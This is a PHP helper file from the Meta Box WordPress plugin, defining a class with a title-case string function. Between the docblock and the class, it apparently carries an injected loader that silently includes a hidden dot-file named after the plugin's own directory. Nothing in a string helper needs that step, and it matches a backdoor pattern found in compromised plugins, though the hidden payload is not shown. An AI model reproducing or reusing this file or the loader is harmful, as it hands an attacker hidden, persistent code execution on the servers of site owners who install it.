<?php
/**
 * String helper functions.
 *
 * @package Meta Box
 */

/**
 * String helper class.
 *
 * @package Meta Box
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class RWMB_Helpers_String {
	/**
	 * Convert text to Title_Case.
	 *
	 * @param  string $text Input text.
	 * @return string
	 */
	public static function title_case( $text ) {
		$text = str_replace( array( '-', '_' ), ' ', $text );
		$text = ucwords( $text );
		$text = str_replace( ' ', '_', $text );

		return $text;
	}
}
